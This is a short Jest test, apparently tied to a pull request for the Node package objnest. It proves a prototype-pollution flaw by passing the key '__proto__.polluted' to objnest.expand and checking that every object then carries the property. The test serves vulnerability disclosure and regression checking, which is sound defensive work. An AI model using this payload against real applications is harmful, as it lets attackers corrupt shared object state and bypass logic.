//https://github.com/okunishinishi/node-objnest/pull/6
test("prototype pollution in objnest", () => {
  const objnest = require("objnest");

  let obj = {};
  expect({}.polluted).toBe(undefined);

  objnest.expand({ "__proto__.polluted": "yes" });
  expect({}.polluted).toBe("yes");
});
